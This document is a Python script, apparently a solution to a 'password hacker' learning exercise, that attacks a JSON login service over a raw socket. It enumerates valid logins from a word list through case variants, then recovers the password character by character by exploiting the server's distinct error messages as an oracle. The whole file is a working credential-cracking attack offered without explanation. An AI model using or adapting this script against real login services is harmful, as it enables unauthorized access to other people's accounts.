import argparse
import socket
import string
import itertools
import json

ASCII_LOWERCASE = string.ascii_lowercase
ASCII_UPPERCASE = string.ascii_uppercase
DIGITS = string.digits
ALPHABET = ASCII_LOWERCASE + ASCII_UPPERCASE + DIGITS

parser = argparse.ArgumentParser()
parser.add_argument("hostname", help="IP address")
parser.add_argument("port", help="port", type=int)
args = parser.parse_args()


def brute_force():
    for i in range(1, 1024):
        for comb in itertools.product(ALPHABET, repeat=i):
            password = ""
            for symbol in comb:
                password += symbol
            yield password


def brute_force_login():
    with open(r"logins.txt",
              "r", encoding="utf8") as fout:
        for login in fout:
            login = login.strip()
            logins = map(lambda x: ''.join(x),
                            itertools.product(*([letter.lower(), letter.upper()]
                                              for letter in login)))
            for login in logins:
                yield login


def brute_force_password():
    with open(r"passwords.txt",
              "r", encoding="utf8") as fout:
        for password in fout:
            password = password.strip()
            passwords = map(lambda x: ''.join(x),
                            itertools.product(*([letter.lower(), letter.upper()]
                                              for letter in password)))
            for password in passwords:
                yield password


def new_brute_force():
    for i in range(1, 1024):
        for letter in ALPHABET:
            yield letter


def main():
    hostname = args.hostname
    port = args.port
    password = ""
    with socket.socket() as client_socket:
        client_socket.connect((hostname, port))
        buffer_size = 1024
        for login in brute_force_login():
            data = {"login": login, "password": " "}
            data = json.dumps(data)
            client_socket.send(data.encode())
            response = json.loads(client_socket.recv(buffer_size).decode())
            if response["result"] == "Wrong password!":
                break
        for letter in new_brute_force():
            test_password = password[:] + letter
            data = {"login": login, "password": test_password}
            data = json.dumps(data)
            client_socket.send(data.encode())
            response = json.loads(client_socket.recv(buffer_size).decode())
            if response["result"] == "Exception happened during login":
                password += letter
            if response["result"] == "Connection success!":
                break
        print(data)


if __name__ == "__main__":
    main()
